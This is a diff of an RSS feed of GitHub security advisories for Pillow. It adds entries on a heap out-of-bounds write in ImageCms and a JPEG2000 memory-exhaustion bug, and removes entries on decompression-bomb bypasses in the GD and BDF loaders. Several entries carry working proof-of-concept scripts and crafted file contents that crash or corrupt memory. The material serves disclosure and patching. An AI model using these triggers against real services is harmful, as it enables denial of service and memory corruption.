@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-20T23:16:36.582Z</updated>
+    <updated>2026-07-21T00:13:03.448Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,215 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow: Controlled heap out-of-bounds write in Pillow `ImageCmsTransform.apply()` via output mode mismatch]]></title>
+        <id>https://github.com/advisories/GHSA-9hw9-ch79-4vh6</id>
+        <link href="https://github.com/advisories/GHSA-9hw9-ch79-4vh6"/>
+        <updated>2026-07-20T23:19:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Pillow's public <code>ImageCms.ImageCmsTransform.apply(im, imOut)</code> API can trigger
+controlled native heap corruption when the caller supplies an output image whose
+mode does not match the transform's declared output mode.</p>
+<p>For example, a transform built as <code>RGBA -&gt; RGBA</code> can be applied to an <code>L</code> output
+image. Pillow checks dimensions only, then calls LittleCMS with the output row
+pointer. LittleCMS writes RGBA-sized rows into a 1-byte-per-pixel <code>L</code> image row.</p>
+<h3 id="details">Details</h3>
+<p><code>src/PIL/ImageCms.py:ImageCmsTransform.apply()</code> accepts an optional caller
+supplied <code>imOut</code>:</p>
+<pre><code class="language-python">def apply(self, im, imOut=None):
+    if imOut is None:
+        imOut = Image.new(self.output_mode, im.size, None)
+    self.transform.apply(im.getim(), imOut.getim())
+    imOut.info["icc_profile"] = self.output_profile.tobytes()
+    return imOut
+</code></pre>
+<p>If <code>imOut</code> is provided, Pillow does not check:</p>
+<pre><code class="language-text">im.mode == self.input_mode
+imOut.mode == self.output_mode
+</code></pre>
+<p>The C wrapper in <code>src/_imagingcms.c</code> unwraps both image cores and only checks
+that the output dimensions are at least as large as the input dimensions:</p>
+<pre><code class="language-c">static int
+pyCMSdoTransform(Imaging im, Imaging imOut, cmsHTRANSFORM hTransform) {
+    if (im-&gt;xsize &gt; imOut-&gt;xsize || im-&gt;ysize &gt; imOut-&gt;ysize) {
+        return -1;
+    }
+
+    for (i = 0; i &lt; im-&gt;ysize; i++) {
+        cmsDoTransform(hTransform, im-&gt;image[i], imOut-&gt;image[i], im-&gt;xsize);
+    }
+
+    pyCMScopyAux(hTransform, imOut, im);
+    return 0;
+}
+</code></pre>
+<p><code>findLCMStype()</code> maps <code>RGB</code>, <code>RGBA</code>, and <code>RGBX</code> transform modes to LittleCMS
+<code>TYPE_RGBA_8</code>, which writes 4 bytes per pixel:</p>
+<pre><code class="language-c">case IMAGING_MODE_RGB:
+case IMAGING_MODE_RGBA:
+case IMAGING_MODE_RGBX:
+    return TYPE_RGBA_8;
+</code></pre>
+<p>So with a transform declared as <code>RGBA -&gt; RGBA</code>, LittleCMS writes <code>4 * width</code>
+bytes to each output row. If the supplied output image is mode <code>L</code>, Pillow only
+allocated <code>1 * width</code> bytes for that row.</p>
+<p>For width 4096:</p>
+<pre><code class="language-text">destination row allocation: 4096 bytes
+LittleCMS write size:       16384 bytes
+overflow:                  ~12288 bytes past the row
+</code></pre>
+<p>The bug does not require a large image. Width 8 was enough to corrupt heap
+metadata. At width 8, <code>apply()</code> returned to Python and printed <code>after</code>; glibc
+detected the corrupted heap later during cleanup.</p>
+<h3 id="poc">PoC</h3>
+<p>Tiny heap corruption trigger:</p>
+<pre><code class="language-python">from PIL import Image, ImageCms
+
+srgb = ImageCms.createProfile("sRGB")
+transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")
+
+im = Image.new("RGBA", (8, 1), (0x41, 0x42, 0x43, 0x44))
+out = Image.new("L", (8, 1), 0)
+
+print("before", flush=True)
+transform.apply(im, out)
+print("after")
+</code></pre>
+<p>Observed locally on Pillow <code>12.3.0.dev0</code>:</p>
+<pre><code class="language-text">before
+after
+free(): invalid next size (normal)
+Aborted (core dumped)
+</code></pre>
+<p>Controlled overwrite evidence PoC:</p>
+<pre><code class="language-python">from PIL import Image, ImageCms
+
+srgb = ImageCms.createProfile("sRGB")
+transform = ImageCms.buildTransform(srgb, srgb, "RGBA", "RGBA")
+
+im = Image.new("RGBA", (4096, 1), (0x41, 0x42, 0x43, 0x44))
+out = Image.new("L", (4096, 1), 0)
+
+transform.apply(im, out)
+</code></pre>
+<p>Run under gdb:</p>
+<pre><code class="language-bash">gdb -q --batch -ex run -ex bt --args \
+  python3 b022_controlled.py
+</code></pre>
+<p>Observed on Pillow <code>12.3.0.dev0</code>:</p>
+<pre><code class="language-text">Program received signal SIGSEGV, Segmentation fault.
+___pthread_mutex_lock (mutex=mutex@entry=0x4443424144434241)
+#1 _cmsLockPrimitive (m=0x4443424144434241)
+#2 defMtxLock (id=0x4443424144434241, mtx=0x4443424144434241)
+#3 _cmsLockMutex (ContextID=0x4443424144434241, mtx=0x4443424144434241)
+#4 cmsSaveProfileToIOhandler(...)
+#5 cmsSaveProfileToMem(...)
+#6 cms_profile_tobytes (...) at src/_imagingcms.c:152
+</code></pre>
+<p><code>0x4443424144434241</code> is the attacker-controlled source pixel pattern
+<code>b"ABCDABCD"</code> interpreted as a little-endian pointer-sized value.</p>
+<p>Using source pixels <code>(1, 2, 3, 4)</code> similarly produced a faulting pointer of
+<code>0x403020104030201</code>, matching the repeated pixel bytes.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a heap out-of-bounds write in Pillow's native ImageCms extension,
+reachable through public API.</p>
+<p>Applications are impacted if untrusted users can control ImageCms transform
+parameters and/or provide the output image object passed to
+<code>ImageCmsTransform.apply()</code>. The source image pixels influence the bytes written
+out of bounds.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Validate modes before calling into the native transform:</p>
+<pre><code class="language-python">def apply(self, im, imOut=None):
+    if im.mode != self.input_mode:
+        raise ValueError("input mode mismatch")
+    if imOut is None:
+        imOut = Image.new(self.output_mode, im.size, None)
+    elif imOut.mode != self.output_mode:
+        raise ValueError("output mode mismatch")
+    self.transform.apply(im.getim(), imOut.getim())
+    imOut.info["icc_profile"] = self.output_profile.tobytes()
+    return imOut
+</code></pre>
+<p>The C extension should also defensively reject mismatched image modes before
+calling <code>cmsDoTransform()</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6">https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59205">https://nvd.nist.gov/vuln/detail/CVE-2026-59205</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/pull/9715">https://github.com/python-pillow/Pillow/pull/9715</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721">https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-9hw9-ch79-4vh6">https://github.com/advisories/GHSA-9hw9-ch79-4vh6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9hw9-ch79-4vh6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T23:19:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pillow] Pillow JPEG2000 tiled decode retains a growing scratch buffer and can be used for denial of service]]></title>
+        <id>https://github.com/advisories/GHSA-vjc4-5qp5-m44j</id>
+        <link href="https://github.com/advisories/GHSA-vjc4-5qp5-m44j"/>
+        <updated>2026-07-20T23:18:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>src/libImaging/Jpeg2KDecode.c:853</code> accumulates <code>total_component_width</code> across every tile in a JPEG2000 image instead of recomputing it per tile. That accumulated value is then used in the <code>tile_bytes</code> calculation at <code>src/libImaging/Jpeg2KDecode.c:868</code>, which can make the decoder grow <code>state-&gt;buffer</code> via <code>realloc</code> at <code>src/libImaging/Jpeg2KDecode.c:876</code> up to roughly one full image's decompressed size even when each tile is small. A crafted tiled JPEG2000 file can therefore force substantially higher transient memory usage and trigger out-of-memory failures during decoding. Based on current evidence, the supported impact is denial of service, not memory corruption.</p>
+<h3 id="details">Details</h3>
+<ul>
+<li>Location: <code>src/libImaging/Jpeg2KDecode.c:853</code></li>
+<li>Root cause: <code>total_component_width</code> is initialized only once before the tile loop and keeps growing across tiles. It is then used to derive <code>tile_bytes</code>, so later tiles are treated as if they had the combined component width of all earlier tiles.</li>
+<li>Dangerous operation: <code>tile_bytes</code> is promoted into <code>tile_info.data_size</code>, then <code>state-&gt;buffer</code> is grown with <code>realloc</code> at <code>src/libImaging/Jpeg2KDecode.c:876</code>.</li>
+<li>Reachability: any attacker-controlled JPEG2000 image with many tiles reaches this path during normal <code>Image.open(...).load()</code> decoding.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>The attached helper script and testcase were used:
+<a href="https://github.com/user-attachments/files/28099912/exercise_j2k_tile_realloc.zip">exercise_j2k_tile_realloc.zip</a></p>
+<p>Generate the testcase:</p>
+<pre><code class="language-bash">pythonexercise_j2k_tile_realloc.py make poc_3664_rgba_tile1832.jp2 \
+  --size 3664 --tile 1832
+</code></pre>
+<p>Expected geometry from the helper:</p>
+<ul>
+<li>image size: <code>3664 x 3664</code></li>
+<li>mode: <code>RGBA</code></li>
+<li>tile size: <code>1832 x 1832</code> (<code>2x2</code> tiles)</li>
+<li><code>image_bytes=53699584</code></li>
+<li>uncapped RSS observed:<ul>
+<li>vulnerable build: <code>maxrss_kb=180264</code></li>
+<li>fixed comparison build: <code>maxrss_kb=138404</code></li>
+</ul>
+</li>
+</ul>
+<p>Load it with the current vulnerable build:</p>
+<pre><code class="language-bash">python exercise_j2k_tile_realloc.py load poc_3664_rgba_tile1832.jp2
+</code></pre>
+<p>Load it again under a 160 MB address-space cap:</p>
+<pre><code class="language-bash">python exercise_j2k_tile_realloc.py load poc_3664_rgba_tile1832.jp2 --limit-mb 160
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Conservative impact: denial of service through memory exhaustion during JPEG2000 decoding.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j">https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59204">https://nvd.nist.gov/vuln/detail/CVE-2026-59204</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/pull/9704">https://github.com/python-pillow/Pillow/pull/9704</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca">https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca</a></li>
+<li><a href="https://github.com/python-pillow/Pillow/releases/tag/12.3.0">https://github.com/python-pillow/Pillow/releases/tag/12.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-vjc4-5qp5-m44j">https://github.com/advisories/GHSA-vjc4-5qp5-m44j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vjc4-5qp5-m44j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-20T23:18:32.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[pillow] Pillow EpsImagePlugin negative %%BeginBinary byte count causes infinite loop denial of service]]></title>
         <id>https://github.com/advisories/GHSA-pg7v-jwj7-p798</id>
@@ -1969,297 +2178,5 @@ assert "REAL_INJECTED" in open(marker).read()          # PASSES
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-20T21:14:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pillow] Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`]]></title>
-        <id>https://github.com/advisories/GHSA-phj9-mv4w-65pm</id>
-        <link href="https://github.com/advisories/GHSA-phj9-mv4w-65pm"/>
-        <updated>2026-07-20T21:13:38.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="description">Description</h2>
-<p><code>PIL/GdImageFile.py</code> <code>GdImageFile._open()</code> reads image dimensions from the GD 2.x header and stores them in <code>self._size</code> without calling <code>Image._decompression_bomb_check()</code>. Because <code>GdImageFile</code> is <strong>not registered with <code>Image.register_open()</code></strong>, it never passes through the standard <code>Image.open()</code> code path that enforces Pillow's decompression bomb guard. The plugin exposes its own entry point — <code>PIL.GdImageFile.open(fp)</code> — which directly instantiates the class, fully bypassing the documented protection.</p>
-<p><strong>Vulnerable code (<code>PIL/GdImageFile.py</code> lines 50–61):</strong></p>
-<pre><code class="language-python">def _open(self) -&gt; None:
-    s = self.fp.read(1037)
-    if i16(s) not in [65534, 65535]:
-        raise SyntaxError("Not a valid GD 2.x .gd file")
-    self._mode = "P"
-    self._size = i16(s, 2), i16(s, 4)   # ← unsigned 16-bit; max 65535 each
-    # NO _decompression_bomb_check() call here ←
-    ...
-    self.tile = [ImageFile._Tile("raw", (0, 0) + self.size, 1037, "L")]
-</code></pre>
-<p>When <code>load()</code> is subsequently called on the returned image object:</p>
-<pre><code class="language-python">load() → load_prepare() → Image.core.new("P", (65535, 65535))
-# ↑ C-level allocation of 4,294,836,225 bytes ≈ 4.3 GB — no Python bomb check precedes this
-</code></pre>
-<p><strong>Dimension arithmetic:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Value</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Maximum width from header</td>
-<td>65,535 (unsigned 16-bit)</td>
-</tr>
-<tr>
-<td>Maximum height from header</td>
-<td>65,535 (unsigned 16-bit)</td>
-</tr>
-<tr>
-<td>Maximum pixel count</td>
-<td>65,535 × 65,535 = <strong>4,294,836,225</strong></td>
-</tr>
-<tr>
-<td><code>DecompressionBombError</code> threshold</td>
-<td>178,956,970 (2 × MAX_IMAGE_PIXELS)</td>
-</tr>
-<tr>
-<td><strong>Overshoot ratio</strong></td>
-<td><strong>24× above DecompressionBombError threshold</strong></td>
-</tr>
-<tr>
-<td>Memory at max dimensions</td>
-<td><strong>≈ 4.3 GB</strong> (palette-mode: 1 byte/pixel)</td>
-</tr>
-<tr>
-<td>Minimum attack file size</td>
-<td><strong>1,037 bytes</strong> (header only — no pixel data needed)</td>
-</tr>
-</tbody></table>
-<p><strong>Comparison with safe sibling plugin (<code>WalImageFile</code>):</strong></p>
-<p><code>WalImageFile</code> is in the same category — not registered with <code>Image.open()</code>, loaded via its own <code>open()</code> helper. It was previously patched with the correct fix:</p>
-<pre><code class="language-python"># PIL/WalImageFile.py line 46 — CORRECT pattern (already patched)
-self._size = i32(header, 32), i32(header, 36)
-Image._decompression_bomb_check(self.size)   # ← present
-</code></pre>
-<p><code>GdImageFile</code> was never updated to match, leaving a gap in protection.</p>
-<h2 id="steps-to-reproduce">Steps to reproduce</h2>
-<p><strong>Proof of Concept script:</strong></p>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""
-PoC: GdImageFile decompression bomb bypass
-1037-byte crafted .gd file → 4.3 GB C-heap allocation, NO bomb check
-"""
-import io, struct
-from PIL import GdImageFile, Image
-
-# Build minimal 1037-byte GD 2.x palette-mode header:
-#   sig(2) + width(2) + height(2) + true_color(1) + tindex(4) + colors_used(2) + palette(1024)
-sig          = struct.pack("&gt;H", 0xFFFE)       # 65534 = GD 2.x magic
-w            = struct.pack("&gt;H", 65535)         # max width
-h            = struct.pack("&gt;H", 65535)         # max height
-true_color   = b"\x00"                          # 0 = palette mode
-tindex       = struct.pack("&gt;I", 0xFFFFFFFF)    # &gt; 255 = no transparency
-colors_used  = b"\x00\x00"
-palette_data = b"\x00" * 1024
-header = sig + w + h + true_color + tindex + colors_used + palette_data
-assert len(header) == 1037
-
-# Confirm: standard Image.open() path BLOCKS this size
-try:
-    Image._decompression_bomb_check((65535, 65535))
-except Image.DecompressionBombError as e:
-    print(f"[BLOCKED] Image.open() path: {e}")
-
-# Vulnerable path: GdImageFile.open() has NO bomb check
-img = GdImageFile.open(io.BytesIO(header))
-print(f"[BYPASS] GdImageFile.open() succeeded: size={img.size}, mode={img.mode}")
-print(f"         No _decompression_bomb_check called — 4.3 GB allocation not blocked")
-
-# Trigger load_prepare() → Image.core.new("P", (65535, 65535))
-try:
-    img.load()
-except OSError:
-    print(f"[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted")
-
-print(f"\n[MATH]   {65535 * 65535:,} pixels = {65535*65535 / (Image.MAX_IMAGE_PIXELS*2):.1f}× error threshold")
-print(f"[MATH]   Attack file: 1,037 bytes only")
-</code></pre>
-<p><strong>Expected output:</strong></p>
-<pre><code>[BLOCKED] Image.open() path: Image size (4294836225 pixels) exceeds limit of 178956970
-pixels, could be decompression bomb DOS attack.
-[BYPASS] GdImageFile.open() succeeded: size=(65535, 65535), mode=P
-         No _decompression_bomb_check called — 4.3 GB allocation not blocked
-[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted
-
-[MATH]   4,294,836,225 pixels = 24.0× error threshold
-[MATH]   Attack file: 1,037 bytes only
-</code></pre>
-<p><strong>Verified live on Pillow 12.2.0.</strong></p>
-<p><strong>Two attack paths:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Path</th>
-<th>File size</th>
-<th>Effect</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Transient (header only)</td>
-<td><strong>1,037 bytes</strong></td>
-<td><code>load_prepare()</code> attempts 4.3 GB C allocation → <code>OSError</code> after spike</td>
-</tr>
-<tr>
-<td>Persistent (full pixel data)</td>
-<td>~4.3 GB</td>
-<td><code>load()</code> completes, 4.3 GB stays in memory for object lifetime</td>
-</tr>
-</tbody></table>
-<p>For the transient path, a 1,037-byte file is all that is needed. The attacker does not need to upload a large file.</p>
-<p><strong>Real-world scenario:</strong></p>
-<pre><code class="language-python">from PIL import GdImageFile
-
-# Application accepts user-uploaded .gd files
-img = GdImageFile.open(user_uploaded_file)   # succeeds — no bomb check
-img.load()                                    # triggers 4.3 GB C-heap allocation
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Availability:</strong> HIGH — a single 1,037-byte malicious <code>.gd</code> file causes the host process to attempt a ~4.3 GB C-heap allocation. On systems with insufficient memory this crashes the process. Repeatable — attacker can loop requests to keep the server down.</li>
-<li><strong>Confidentiality:</strong> None</li>
-<li><strong>Integrity:</strong> None</li>
-<li><strong>Authentication required:</strong> No — any public endpoint accepting image uploads is affected</li>
-<li><strong>User interaction:</strong> None</li>
-</ul>
-<p>Any service that calls <code>PIL.GdImageFile.open(user_file)</code> followed by <code>.load()</code> (or any lazy-load trigger) is vulnerable. Because the attack requires only a 1,037-byte file, network bandwidth is not a constraint.</p>
-<p>Confirmed unpatched on <code>python-pillow/Pillow</code> <code>main</code> branch as of 2026-06-08.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm">https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55380">https://nvd.nist.gov/vuln/detail/CVE-2026-55380</a></li>
-<li><a href="https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675">https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml</a></li>
-<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
-<li><a href="https://github.com/advisories/GHSA-phj9-mv4w-65pm">https://github.com/advisories/GHSA-phj9-mv4w-65pm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-phj9-mv4w-65pm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T21:13:35.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pillow] Pillow `BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading]]></title>
-        <id>https://github.com/advisories/GHSA-45hq-cxwh-f6vc</id>
-        <link href="https://github.com/advisories/GHSA-45hq-cxwh-f6vc"/>
-        <updated>2026-07-20T21:13:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>PIL/BdfFontFile.py</code> <code>bdf_char()</code> (lines 84–88) reads the <code>BBX width height</code> field from a BDF font file and passes the dimensions directly to <code>Image.new()</code> without calling <code>Image._decompression_bomb_check()</code>. This completely bypasses Pillow's documented decompression bomb protection.</p>
-<p><code>Image.open()</code> enforces <code>MAX_IMAGE_PIXELS = 89,478,485</code> and raises <code>DecompressionBombError</code> for images exceeding <code>2 × MAX = 178,956,970</code> pixels. The BDF font loading path calls <code>Image.new()</code> directly, which only calls <code>_check_size()</code> (validates <code>&gt;= 0</code>) — no pixel count limit.</p>
-<p><strong>Vulnerable code (<code>PIL/BdfFontFile.py</code> lines 84–88):</strong></p>
-<pre><code class="language-python"># width, height from attacker-controlled "BBX width height x y" line
-try:
-    im = Image.frombytes("1", (width, height), bitmap, "hex", "1")
-except ValueError:
-    # TRIGGERED when BITMAP section is empty (zero hex lines)
-    im = Image.new("1", (width, height))   # ← NO _decompression_bomb_check()!
-    # ^ This image is stored in self.glyph[ch] — persists in memory
-</code></pre>
-<p><strong>Attack trigger:</strong> A BDF glyph with <code>BBX 20000 20000</code> and an empty <code>BITMAP</code> section causes <code>Image.frombytes()</code> to raise <code>ValueError</code>, then <code>Image.new("1", (20000, 20000))</code> allocates <strong>50 MB</strong> of C-heap silently. Image.open() would raise <code>DecompressionBombError</code> for the same dimensions.</p>
-<h2 id="steps-to-reproduce">Steps to reproduce</h2>
-<p><strong>Minimal malicious BDF file (270 bytes):</strong></p>
-<pre><code>STARTFONT 2.1
-SIZE 16 75 75
-FONTBOUNDINGBOX 16 16 0 -4
-STARTPROPERTIES 1
-COMMENT placeholder
-ENDPROPERTIES
-CHARS 1
-STARTCHAR A
-ENCODING 65
-SWIDTH 500 0
-DWIDTH 8 0
-BBX 20000 20000 0 0
-BITMAP
-ENDCHAR
-ENDFONT
-</code></pre>
-<p><strong>Proof of Concept script:</strong></p>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""PoC: BdfFontFile bomb bypass — 270-byte BDF → 50 MB allocation"""
-import io, warnings
-warnings.filterwarnings("ignore")
-
-from PIL.BdfFontFile import BdfFontFile
-from PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError
-
-W, H = 20000, 20000   # 400M pixels → above DecompressionBombError threshold
-
-# Show what Image.open() would do
-warnings.filterwarnings("error", category=DecompressionBombWarning)
-try:
-    _decompression_bomb_check((W, H))
-except (DecompressionBombWarning, DecompressionBombError) as e:
-    print(f"[Image.open() path] BLOCKED by {type(e).__name__}")
-warnings.filterwarnings("ignore")
-
-# Malicious BDF: large BBX + empty BITMAP → ValueError → Image.new() without bomb check
-bdf = f"""STARTFONT 2.1
-SIZE 16 75 75
-FONTBOUNDINGBOX 16 16 0 -4
-STARTPROPERTIES 1
-COMMENT x
-ENDPROPERTIES
-CHARS 1
-STARTCHAR A
-ENCODING 65
-SWIDTH 500 0
-DWIDTH 8 0
-BBX {W} {H} 0 0
-BITMAP
-ENDCHAR
-ENDFONT
-""".encode()
-
-print(f"[*] BDF file size  : {len(bdf)} bytes")
-print(f"[*] Glyph size     : {W} x {H} = {W*H:,} pixels")
-print(f"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)")
-
-BdfFontFile(io.BytesIO(bdf))   # No exception — bomb check bypassed!
-
-print(f"[!] CONFIRMED: BdfFontFile loaded silently — {W*H//8//1024**2} MB allocated")
-print(f"    Image.open() path would have raised DecompressionBombError")
-</code></pre>
-<p><strong>Expected output:</strong></p>
-<pre><code>[Image.open() path] BLOCKED by DecompressionBombError
-[*] BDF file size  : 270 bytes
-[*] Glyph size     : 20000 x 20000 = 400,000,000 pixels
-[*] C-heap target  : 47 MB  (mode '1' = 1 bit/pixel)
-[!] CONFIRMED: BdfFontFile loaded silently — 47 MB allocated
-    Image.open() path would have raised DecompressionBombError
-</code></pre>
-<p><strong>Amplified attack (multiple glyphs):</strong><br>A BDF file defining 256 glyphs each at <code>BBX 8000 8000</code> causes <code>256 × 7.6 MB = ~1.95 GB</code> total C-heap allocation — all silently, bypassing documented bomb protection.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Availability</strong>: HIGH — attacker-controlled memory allocation per glyph × up to 65,536 glyphs</li>
-<li><strong>Confidentiality</strong>: None  </li>
-<li><strong>Integrity</strong>: None</li>
-<li>Any service loading BDF fonts from untrusted sources (e.g., <code>ImageFont.load("user.bdf")</code>, <code>BdfFontFile(fp)</code>) is affected</li>
-<li>Loaded glyph images persist in <code>self.glyph[ch]</code> for the lifetime of the font object — memory is NOT freed until the font is garbage collected</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc">https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55379">https://nvd.nist.gov/vuln/detail/CVE-2026-55379</a></li>
-<li><a href="https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d">https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml</a></li>
-<li><a href="https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst">https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst</a></li>
-<li><a href="https://github.com/advisories/GHSA-45hq-cxwh-f6vc">https://github.com/advisories/GHSA-45hq-cxwh-f6vc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-45hq-cxwh-f6vc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-20T21:13:18.000Z</published>
     </entry>
 </feed>
